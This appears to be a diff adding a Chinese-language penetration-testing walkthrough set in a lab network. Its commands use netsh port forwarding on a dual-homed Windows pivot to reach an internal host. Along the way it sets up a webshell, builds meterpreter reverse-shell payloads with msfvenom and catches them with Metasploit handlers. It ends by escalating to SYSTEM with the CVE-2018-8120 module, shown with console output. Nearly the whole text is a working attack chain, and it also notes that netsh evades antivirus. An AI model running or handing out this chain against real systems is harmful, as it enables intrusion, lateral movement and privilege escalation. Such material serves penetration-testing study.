@@ -1,0 +1,168 @@
+netsh反向代理:
+
+netsh简介:
+netsh是windows系统自带的网络配置命令行工具 所以具有免杀的效果
+#使用前提： administrator 或  system 权限
+
+网络主机环境:
+kali        192.168.1.15  #攻击机器
+win2008     192.168.1.53  10.30.30.131  #跳板机  双网卡
+win2012     10.30.30.128  #目标机器
+
+#跳板机 win2008 开启所有防火墙  只有80端口对外开放
+netsh advfirewall firewall add rule name="website" dir=in action=allow protocol=TCP localport=80
+# dir = in | out    入站和出站
+# action = allow    动作 接受
+# protocol = TCP    协议 TCP
+# localport = 80    本地端口 80
+
+防火墙操作:
+#防火墙启动和关闭
+netsh advfirewall set allprofiles state on  #启用防火墙
+netsh advfirewall set allprofiles state off #关闭防火墙
+
+#放行和阻止服务
+netsh firewall set service remoteadmin disable  #阻止远程管理服务
+netsh firewall set service remotedesktop enable #放行远程桌面服务 3389
+
+#删除rule 和 portproxy
+netsh interface portproxy delete v4tov4 listenport=1717   #删除监听端口为1717的 v4tov4
+netsh advfirewall firewall delete rule name="2012-msf-2008"  #删除名称为 2012-msf-2008 的rule
+
+#查看防火墙
+netsh firewall show state
+
+#查看netsh规则
+netsh interface portproxy show in
+
+渗透内网步骤 (通过在跳板机win2008添加防火墙规则  将目标机win2012 shell反弹到 kali的msf中):
+#1. 获取跳板机win2008 webshell  上传exe木马  反弹到kali
+#2. 跳板机上添加防火墙规则  允许外网访问跳板机TCP协议1616端口
+netsh advfirewall firewall add rule name="2008-web-2012" dir=in action=allow protocol=TCP 
+localport=1616
+
+#3. 添加跳板机的netsh规则 把跳板机外网ip 192.168.1.53 的1616端口映射到内网 10.30.30.128 的8080端口上
+netsh interface portproxy add v4tov4 listenport=1616 connectaddress=10.30.30.128 connectport=8080
+
+#4. kali 访问 目标机器2012 web网站
+http://192.168.1.53:1616/index.php  #跳板机1616端口  映射到 10.30.30.128 8080端口
+#相当于访问的是  http://10.30.30.128:8080/index.php
+
+#5. 获取目标机器 win2012 的webshell
+蚁剑连接  http://192.168.1.53:1616/shell.php
+
+#6. 制作木马反弹流量到跳板机内网ip 10.30.30.131的1717端口上，然后通过跳板机转发到kali的msf上
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.30.30.131 lport=1717 -f exe -o msf1717.exe
+
+#7. kali开启监听 1818 端口
+msf6 > use exploit/multi/handler
+#[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+#payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 192.168.1.15
+#lhost => 192.168.1.15
+msf6 exploit(multi/handler) > set lport 1818
+#lport => 1818
+
+#8. 跳板机的防火墙添加允许TCP 1717 端口 进站 
+netsh advfirewall firewall add rule name="2012-msf-2008" dir=in action=allow protocol=TCP
+localport=1717
+
+#9. 跳板机上添加规则转发跳板机的内网ip 10.30.30.131 的1717端口的流量到外网kali 192.168.1.15的1818端口上
+netsh interface portproxy add v4tov4 listenport=1717 connectaddress=192.168.1.15 connectport=1818
+
+#10. 获得shell
+meterpreter > getsid
+# Server SID: S-1-5-21-1682893898-3335100333-583591445-1000
+meterpreter > getuid
+# Server username: WIN7-USER\win7host
+meterpreter > 
+
+
+shell提权:
+#msf1 为普通用户权限  需要进行提权  
+#因为需要端口转发  提权后shell 不能直接连现在的sessions
+
+msf2 需要再开启一个 msf 进行监听其他端口 2020:
+msf6 > use exploit/multi/handler
+# [*] Using configured payload generic/shell_reverse_tcp
+
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+# payload => windows/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set lhost 192.168.1.15
+# lhost => 192.168.1.15
+
+msf6 exploit(multi/handler) > set lport 2020
+# lport => 2020
+
+msf6 exploit(multi/handler) > run
+
+win2008 跳板机 需要再增加一个端口转发:
+netsh advfirewall firewall add rule name="2012-privi-kali" dir=in action=allow protocol=tcp localport=1919
+# netsh advfirewall firewall add rule name="2012-privi-kali" dir=in action=allow protocol=tcp localport=1919
+# Ok.
+
+netsh interface portproxy add v4tov4 listenport=1919 connectaddress=192.168.1.15 connectport=2020
+#netsh interface portproxy add v4tov4 listenport=1919 connectaddress=192.168.1.15 connectport=2020
+
+netsh interface portproxy show all
+# Listen on ipv4:             Connect to ipv4:
+# Address         Port        Address         Port
+# --------------- ----------  --------------- ----------
+# *               1616        10.30.30.130    80
+# *               1717        192.168.1.15    1818
+*               1919        192.168.1.15    2020   #将 1919 端口的提权后shell  转发到kali  2020端口
+
+msf1  使用cve-2018-8120:
+msf6 exploit(windows/local/ms18_8120_win32k_privesc) > search cve-2018-8120
+# Matching Modules
+# ================
+#    #  Name                                            Disclosure Date  Rank  Check  Description
+#    -  ----                                            ---------------  ----  -----  -----------
+#    0  exploit/windows/local/ms18_8120_win32k_privesc  2018-05-09       good  No     Windows SetImeInfoEx Win32k NULL Pointer Dereference
+# Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms18_8120_win32k_privesc                                                                                                                
+msf6 exploit(windows/local/ms18_8120_win32k_privesc) > use 0
+# [*] Using configured payload windows/meterpreter/reverse_tcp
+
+msf6 exploit(windows/local/ms18_8120_win32k_privesc) > options
+# Module options (exploit/windows/local/ms18_8120_win32k_privesc):
+#    Name     Current Setting  Required  Description
+#    ----     ---------------  --------  -----------
+#    SESSION  1                yes       The session to run this module on
+# Payload options (windows/meterpreter/reverse_tcp):
+#    Name      Current Setting  Required  Description
+#    ----      ---------------  --------  -----------
+#    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+#    LHOST     10.30.30.131     yes       The listen address (an interface may be specified)
+#    LPORT     1919             yes       The listen port
+
+msf6 exploit(windows/local/ms18_8120_win32k_privesc) > run
+
+
+msf2 提权shell:
+meterpreter > getuid
+# Server username: NT AUTHORITY\SYSTEM
+meterpreter > getsid
+# Server SID: S-1-5-18
+meterpreter > getpid
+# Current pid: 10708
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
